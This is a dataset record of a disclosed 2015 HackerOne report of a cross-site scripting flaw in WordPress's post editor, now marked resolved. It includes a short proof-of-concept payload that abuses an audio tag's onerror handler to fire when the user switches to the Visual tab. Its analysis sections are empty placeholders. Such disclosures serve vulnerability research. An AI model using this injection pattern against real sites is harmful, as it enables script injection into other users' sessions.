---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '81736'
original_report_id: '81736'
title: XSS in WordPress
weakness: Cross-site Scripting (XSS) - Generic
team_handle: automattic
created_at: '2015-08-11T15:25:36.288Z'
disclosed_at: '2015-10-16T16:17:29.199Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in WordPress

## Metadata

- HackerOne Report ID: 81736
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: automattic
- Disclosed At: 2015-10-16T16:17:29.199Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi there  ,

I have identified a WordPress security vulnerability , a potential XSS vulnerability that affects latest version of WordPress .

POC :-

Go to GET *****.wordpress.com/wp-admin/post-new.php

In Text (HTML Field) input , <HTML xmlns: ><audio>
<audio src=wp onerror=alert(0X1)>


Now, Click on Visual Tab , XSS will trigger . (Screenshot attached )

Thanks and please address this issue .

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
